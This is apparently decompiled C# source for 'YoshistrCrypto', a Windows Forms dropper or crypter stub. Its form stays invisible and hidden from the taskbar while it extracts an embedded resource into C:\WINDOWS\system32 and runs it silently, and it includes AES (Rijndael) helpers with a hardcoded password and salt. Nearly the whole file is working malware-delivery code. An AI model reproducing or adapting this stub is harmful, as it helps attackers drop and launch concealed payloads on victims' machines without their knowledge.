using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using YoshistrCrypto.Properties;

namespace YoshistrCrypto;

public class Form1 : Form
{
	private IContainer components;

	public static string Password = "EMTPYPASSWORD";

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	public Form1()
	{
		InitializeComponent();
	}

	public static string encyptor(string inC)
	{
		byte[] bytes = Encoding.Unicode.GetBytes(inC);
		PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(Password, new byte[13]
		{
			73, 118, 97, 110, 32, 77, 101, 100, 118, 101,
			100, 101, 118
		});
		byte[] inArray = Encrypt(bytes, passwordDeriveBytes.GetBytes(32), passwordDeriveBytes.GetBytes(16));
		return Convert.ToBase64String(inArray);
	}

	public static string dencyptor(string inC)
	{
		byte[] cipherData = Convert.FromBase64String(inC);
		PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(Password, new byte[13]
		{
			73, 118, 97, 110, 32, 77, 101, 100, 118, 101,
			100, 101, 118
		});
		byte[] bytes = Decrypt(cipherData, passwordDeriveBytes.GetBytes(32), passwordDeriveBytes.GetBytes(16));
		return Encoding.Unicode.GetString(bytes);
	}

	public static byte[] Encrypt(byte[] clearData, byte[] Key, byte[] IV)
	{
		MemoryStream memoryStream = new MemoryStream();
		Rijndael rijndael = Rijndael.Create();
		rijndael.Key = Key;
		rijndael.IV = IV;
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateEncryptor(), CryptoStreamMode.Write);
		cryptoStream.Write(clearData, 0, clearData.Length);
		cryptoStream.Close();
		return memoryStream.ToArray();
	}

	public static byte[] Decrypt(byte[] cipherData, byte[] Key, byte[] IV)
	{
		MemoryStream memoryStream = new MemoryStream();
		Rijndael rijndael = Rijndael.Create();
		rijndael.Key = Key;
		rijndael.IV = IV;
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
		cryptoStream.Write(cipherData, 0, cipherData.Length);
		cryptoStream.Close();
		return memoryStream.ToArray();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		string text = "";
		string text2 = "";
		try
		{
			text = Settings.Default.LoadR;
			text2 = text.Substring(text.LastIndexOf("\\") + 1, text.Length - (text.LastIndexOf("\\") + 1));
		}
		catch (Exception)
		{
		}
		try
		{
			text.Substring(text.LastIndexOf("."), text.Length - text.LastIndexOf("."));
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(text2);
			FileStream fileStream = new FileStream("C:\\WINDOWS\\system32\\" + text2, FileMode.Create);
			using (fileStream)
			{
				byte[] array = new byte[32768];
				int count;
				while ((count = manifestResourceStream.Read(array, 0, array.Length)) > 0)
				{
					fileStream.Write(array, 0, count);
				}
			}
			fileStream.Close();
			Thread.Sleep(200);
			try
			{
				ThreadPool.QueueUserWorkItem(runProc, "C:\\WINDOWS\\system32\\" + text2);
				Thread.Sleep(500);
				Application.Exit();
			}
			catch (Exception)
			{
				Thread.Sleep(200);
				ThreadPool.QueueUserWorkItem(runProc, "C:\\WINDOWS\\system32\\" + text2);
				Thread.Sleep(500);
				Application.Exit();
			}
		}
		catch (Exception ex3)
		{
			MessageBox.Show(ex3.ToString());
		}
	}

	public static void runProc(object discrept)
	{
		try
		{
			Process.Start((string)discrept);
		}
		catch
		{
		}
	}

	public void ExtractFileFromResources(string filename, string location)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(filename);
		if (manifestResourceStream != null)
		{
			BinaryReader binaryReader = new BinaryReader(manifestResourceStream);
			FileStream output = new FileStream(location, FileMode.Create);
			BinaryWriter binaryWriter = new BinaryWriter(output);
			byte[] array = new byte[manifestResourceStream.Length];
			manifestResourceStream.Read(array, 0, array.Length);
			binaryWriter.Write(array);
			binaryReader.Close();
			binaryWriter.Close();
			manifestResourceStream.Close();
		}
	}

	public static byte[] StrToByteArray(string str)
	{
		ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
		return aSCIIEncoding.GetBytes(str);
	}

	public byte[] ReadByteArrayFromFile(string fileName)
	{
		byte[] array = null;
		FileStream input = new FileStream(fileName, FileMode.Open, FileAccess.Read);
		BinaryReader binaryReader = new BinaryReader(input);
		long length = new FileInfo(fileName).Length;
		return binaryReader.ReadBytes((int)length);
	}
}
